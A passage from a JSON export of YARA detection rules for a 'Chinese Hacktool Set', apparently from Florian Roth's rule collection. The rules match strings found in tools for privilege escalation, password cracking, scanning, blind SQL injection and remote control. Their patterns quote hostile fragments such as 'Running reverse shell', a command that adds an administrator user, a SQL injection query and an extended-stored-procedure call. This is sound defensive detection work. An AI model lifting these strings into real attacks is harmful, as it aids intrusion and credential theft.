%d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d\" fullword ascii\n      $s3 = \"A FsSniffer backdoor seems to be running on this port%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1360KB and all of them\n}","date":"2015-06-13 09:00:51","description":"Chinese Hacktool Set - file NaslLib.dll","minimum_yara":"1.7","name":"dat_NaslLib_RID2B4E","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2fa3d0c5b58f509b508242fc88a5ff38","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule OtherTools_servu_RID2DB8 : CHINA DEMO FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file svu.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"MZKERNEL32.DLL\" fullword ascii\n      $s1 = \"UpackByDwing@\" fullword ascii\n      $s2 = \"GetProcAddress\" fullword ascii\n      $s3 = \"WriteFile\" fullword ascii\n   condition: \n      uint32 ( 0 ) == 0x454b5a4d and $s0 at 0 and filesize < 50KB and all of them\n}","date":"2015-06-13 10:43:51","description":"Chinese Hacktool Set - file svu.exe","minimum_yara":"1.7","name":"OtherTools_servu_RID2DB8","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e387f9e7347d0de0822e8fd3d156951b","score":70,"tags":["DEMO","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ustrrefadd_RID2B45 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ustrrefadd_RID2B45.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"E-Mail  : admin@luocong.com\" fullword ascii\n      $s1 = \"Homepage: http://www.luocong.com\" fullword ascii\n      $s2 = \": %d  -  \" fullword ascii\n      $s3 = \"ustrreffix.dll\" fullword ascii\n      $s5 = \"Ultra String Reference plugin v%d.%02d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 320KB and all of them\n}","date":"2015-06-13 08:59:21","description":"Chinese Hacktool Set - file ustrrefadd.dll","minimum_yara":"1.7","name":"ustrrefadd_RID2B45","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"955b7d6fe9ebfa6ebd2636b3b7a28eb1","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule XScanLib_RID2A05 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file XScanLib_RID2A05.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:00:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"XScanLib_RID2A05.dll\" fullword ascii\n      $s6 = \"Ports/%s/%d\" fullword ascii\n      $s8 = \"DEFAULT-TCP-PORT\" fullword ascii\n      $s9 = \"PlugCheckTcpPort\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 360KB and all of them\n}","date":"2015-06-13 03:00:01","description":"Chinese Hacktool Set - file XScanLib.dll","minimum_yara":"1.7","name":"XScanLib_RID2A05","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"ed014cfe2e5173965671acf14f479f0a","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule IDTools_For_WinXP_IdtTool_RID3088 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IdtTool.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"IdtTool.sys\" fullword ascii\n      $s4 = \"Idt Tool bY tMd[CsP]\" fullword wide\n      $s6 = \"\\\\\\\\.\\\\slIdtTool\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them\n}","date":"2015-06-13 12:43:51","description":"Chinese Hacktool Set - file IdtTool.exe","minimum_yara":"1.7","name":"IDTools_For_WinXP_IdtTool_RID3088","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"950abb138df278ba8ce65424df409daf","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule GoodToolset_ms11046_RID2DBF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11046.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] Token system command\" fullword ascii\n      $s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s3 = \"[*] Add to Administrators success\" fullword ascii\n      $s4 = \"[*] User has been successfully added\" fullword ascii\n      $s5 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 840KB and 2 of them\n}","date":"2015-06-13 10:45:01","description":"Chinese Hacktool Set - file ms11046.exe","minimum_yara":"1.7","name":"GoodToolset_ms11046_RID2DBF","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2b99f21021d9c92e9245fde198eb1cfc","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Sniffer_analyzer_SSClone_1210_full_version_RID3733 : CHINA DEMO EXE FILE HKTL T1040 {\n   meta:\n      description = \"Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 17:28:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://www.vip80000.com/hot/index.html\" fullword ascii\n      $s1 = \"GetConnectString\" fullword ascii\n      $s2 = \"CnCerT.Safe.SSClone.dll\" fullword ascii\n      $s3 = \"(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3580KB and all of them\n}","date":"2015-06-13 17:28:21","description":"Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe","minimum_yara":"1.7","name":"Sniffer_analyzer_SSClone_1210_full_version_RID3733","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"8d6eded396110038a3bf1288d1f9fcf6","score":70,"tags":["T1040","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule x64_klock_RID2A66 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file klock.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:41:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bienvenue dans un processus distant\" fullword wide\n      $s2 = \"klock.dll\" fullword ascii\n      $s3 = \"Erreur : le bureau courant (\" fullword wide\n      $s4 = \"klock de mimikatz pour Windows\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 907KB and all of them\n}","date":"2015-06-13 05:41:41","description":"Chinese Hacktool Set - file klock.dll","minimum_yara":"1.7","name":"x64_klock_RID2A66","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3388b3ae5374ca973c3c930e299bfb9b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule MarathonTool_2_RID2C7A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MarathonTool.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"http://localhost/retomysql/pista.aspx?id_pista=1\" fullword wide\n      $s6 = \"SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS\" fullword wide\n      $s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-13 09:50:51","description":"Chinese Hacktool Set - file MarathonTool.exe","minimum_yara":"1.7","name":"MarathonTool_2_RID2C7A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"37cd7001e0a4b6f496edbbfaa67ce64b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule scanms_scanms_RID2C7A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file scanms.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"--- ScanMs Tool --- (c) 2003 Internet Security Systems ---\" fullword ascii\n      $s2 = \"Scans for systems vulnerable to MS03-026 vuln\" fullword ascii\n      $s3 = \"More accurate for WinXP/Win2k, less accurate for WinNT\" fullword ascii\n      $s4 = \"added %d.%d.%d.%d-%d.%d.%d.%d\" fullword ascii\n      $s5 = \"Internet Explorer 1.0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them\n}","date":"2015-06-13 09:50:51","description":"Chinese Hacktool Set - file scanms.exe","minimum_yara":"1.7","name":"scanms_scanms_RID2C7A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b52342e86243eef95bab5f4c69b3f3d6","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_PcShare_RID2D17 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PcShare.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:17:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;\" fullword wide\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n      $s2 = \"http://www.pcshares.cn/pcshare200/lostpass.asp\" fullword wide\n      $s5 = \"port=%s;name=%s;pass=%s;\" fullword wide\n      $s16 = \"%s\\\\ini\\\\*.dat\" fullword wide\n      $s17 = \"pcinit.exe\" fullword wide\n      $s18 = \"http://www.pcshare.cn\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 3 of them\n}","date":"2015-06-13 10:17:01","description":"Chinese Hacktool Set - file PcShare.exe","minimum_yara":"1.7","name":"CN_Tools_PcShare_RID2D17","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"ed3e2aa5e63c07dd3c0b0f24b672e89d","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule pw_inspector_RID2C2E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pw-inspector.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:38:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-m MINLEN  minimum length of a valid password\" fullword ascii\n      $s2 = \"http://www.thc.org\" fullword ascii\n      $s3 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 460KB and all of them\n}","date":"2015-06-13 09:38:11","description":"Chinese Hacktool Set - file pw-inspector.exe","minimum_yara":"1.7","name":"pw_inspector_RID2C2E","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"cdb2585b1cd68ce4c169bfd8e44b3ea2","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dll_LoadEx_RID2AC9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Dll_LoadEx_RID2AC9.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:26:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WiNrOOt@126.com\" fullword wide\n      $s1 = \"Dll_LoadEx_RID2AC9.EXE\" fullword wide\n      $s3 = \"You Already Loaded This DLL ! :(\" fullword ascii\n      $s10 = \"Dll_LoadEx_RID2AC9 Microsoft \" fullword wide\n      $s17 = \"Can't Load This Dll ! :(\" fullword ascii\n      $s18 = \"WiNrOOt\" fullword wide\n      $s20 = \" Dll_LoadEx_RID2AC9(&A)...\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and 3 of them\n}","date":"2015-06-13 08:26:41","description":"Chinese Hacktool Set - file Dll_LoadEx.exe","minimum_yara":"1.7","name":"Dll_LoadEx_RID2AC9","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e350443a78dbea2e37af1c0eed6155cf","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_iis7_RID2A12 : CHINA DEMO EXE FILE HKTL T1033 {\n   meta:\n      description = \"Chinese Hacktool Set - file iis7.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\\\\\localhost\" fullword ascii\n      $s1 = \"iis.run\" fullword ascii\n      $s3 = \">Could not connecto %s\" fullword ascii\n      $s5 = \"WHOAMI\" ascii\n      $s13 = \"WinSta0\\\\Default\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them\n}","date":"2015-06-13 03:21:41","description":"Chinese Hacktool Set - file iis7.exe","minimum_yara":"1.7","name":"Dos_iis7_RID2A12","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"573a12eb9749981f13f13e44f5251747","score":70,"tags":["T1033","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule SQLCracker_RID2ABC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SQLCracker_RID2ABC.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msvbvm60.dll\" fullword ascii\n      $s1 = \"_CIcos\" fullword ascii\n      $s2 = \"kernel32.dll\" fullword ascii\n      $s3 = \"cKmhV\" fullword ascii\n      $s4 = \"080404B0\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 125KB and all of them\n}","date":"2015-06-13 08:05:01","description":"Chinese Hacktool Set - file SQLCracker.exe","minimum_yara":"1.7","name":"SQLCracker_RID2ABC","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d72f12da7b9ac7e7aa16be5cbaccc86d","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule FreeVersion_debug_RID2DDF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file debug.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:50:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n      $s1 = \"Got WMI process Pid: %d\" ascii\n      $s2 = \"This exploit will execute\" ascii\n      $s6 = \"Found token %s \" ascii\n      $s7 = \"Running reverse shell\" ascii\n      $s10 = \"wmiprvse.exe\" fullword ascii\n      $s12 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 820KB and 3 of them\n}","date":"2015-06-13 10:50:21","description":"Chinese Hacktool Set - file debug.exe","minimum_yara":"1.7","name":"FreeVersion_debug_RID2DDF","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"cb480065ffcf4fa6695aa67f53b226b2","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_look_RID2A4B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file look.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 04:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>CHKen QQ:41901298</description>\" fullword ascii\n      $s2 = \"version=\\\"9.9.9.9\\\"\" fullword ascii\n      $s3 = \"name=\\\"CH.Ken.Tool\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}","date":"2015-06-13 04:56:41","description":"Chinese Hacktool Set - file look.exe","minimum_yara":"1.7","name":"Dos_look_RID2A4B","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b42d4ad1d0136cbaf5ee1e0f9e211ccd","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule NtGodMode_RID2A72 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NtGodMode_RID2A72.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"to HOST!\" fullword ascii\n      $s1 = \"SS.EXE\" fullword ascii\n      $s5 = \"lstrlen0\" fullword ascii\n      $s6 = \"Virtual\" fullword ascii\n      $s19 = \"RtlUnw\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and all of them\n}","date":"2015-06-13 06:01:41","description":"Chinese Hacktool Set - file NtGodMode.exe","minimum_yara":"1.7","name":"NtGodMode_RID2A72","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"245d5fe8bfa6e3f206861182b9557aa2","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WebCrack4_RouterPasswordCracking_RID339C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:55:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD\" fullword ascii\n      $s1 = \"Username: \\\"%s\\\", Password: \\\"%s\\\", Remarks: \\\"%s\\\"\" fullword ascii\n      $s14 = \"user:\\\"%s\\\" pass: \\\"%s\\\" result=\\\"%s\\\"\" fullword ascii\n      $s16 = \"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)\" fullword ascii\n      $s20 = \"List count out of bounds (%d)+Operation not allowed on sorted string list%String\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them\n}","date":"2015-06-13 14:55:11","description":"Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe","minimum_yara":"1.7","name":"WebCrack4_RouterPasswordCracking_RID339C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9b8787adb3ffde114a5b882d54039305","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule S_MultiFunction_Scanners_s_RID3182 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file s.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe /l=\" fullword ascii\n      $s1 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe\" fullword ascii\n      $s2 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe tcp \" fullword ascii\n      $s3 = \"explorer.exe http://www.hackdos.com\" fullword ascii\n      $s4 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe\" fullword ascii\n      $s5 = \"Failed to read file or invalid data in file!\" fullword ascii\n      $s6 = \"www.hackdos.com\" fullword ascii\n      $s7 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n      $s11 = \"The interface of kernel library is invalid!\" fullword ascii\n      $s12 = \"eventvwr\" fullword ascii\n      $s13 = \"Failed to decompress data!\" fullword ascii\n      $s14 = \"NOTEPAD.EXE result.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and 4 of them\n}","date":"2015-06-13 13:25:31","description":"Chinese Hacktool Set - file s.exe","minimum_yara":"1.7","name":"S_MultiFunction_Scanners_s_RID3182","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b0e83c4f048f21a76a79c3383cfdde8c","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_GetPass_RID2B4D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file GetPass.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetLogonS\" ascii\n      $s3 = \"/showthread.php?t=156643\" ascii\n      $s8 = \"To Run As Administ\" ascii\n      $s18 = \"EnableDebugPrivileg\" fullword ascii\n      $s19 = \"sedebugnameValue\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 890KB and all of them\n}","date":"2015-06-13 09:00:41","description":"Chinese Hacktool Set - file GetPass.exe","minimum_yara":"1.7","name":"Dos_GetPass_RID2B4D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"aa6e1d90f2e7aed657b99e383b323f85","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule update_PcMain_RID2C2B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PcMain.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:37:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322\" ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n      $s2 = \"SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\" fullword ascii\n      $s3 = \"\\\\svchost.exe -k \" fullword ascii\n      $s4 = \"SYSTEM\\\\ControlSet001\\\\Services\\\\%s\" fullword ascii\n      $s9 = \"Global\\\\%s-key-event\" fullword ascii\n      $s10 = \"%d%d.exe\" fullword ascii\n      $s14 = \"%d.exe\" fullword ascii\n      $s15 = \"Global\\\\%s-key-metux\" fullword ascii\n      $s18 = \"GET / HTTP/1.1\" fullword ascii\n      $s19 = \"\\\\Services\\\\\" fullword ascii\n      $s20 = \"qy001id=%d;qy001guid=%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them\n}","date":"2015-06-13 09:37:41","description":"Chinese Hacktool Set - file PcMain.dll","minimum_yara":"1.7","name":"update_PcMain_RID2C2B","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"ea78325118cd0a1ab10ec174e60f5641","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_sys_RID29F5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file sys.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 02:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"'SeDebugPrivilegeOpen \" fullword ascii\n      $s6 = \"Author: Cyg07*2\" fullword ascii\n      $s12 = \"from golds7n[LAG]'J\" fullword ascii\n      $s14 = \"DAMAGE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}","date":"2015-06-13 02:33:21","description":"Chinese Hacktool Set - file sys.exe","minimum_yara":"1.7","name":"Dos_sys_RID29F5","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d83d40b264e8f142eced140de3777737","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Project1_RID2A19 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Project1_RID2A19.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"EXEC master.dbo.sp_addextendedproc 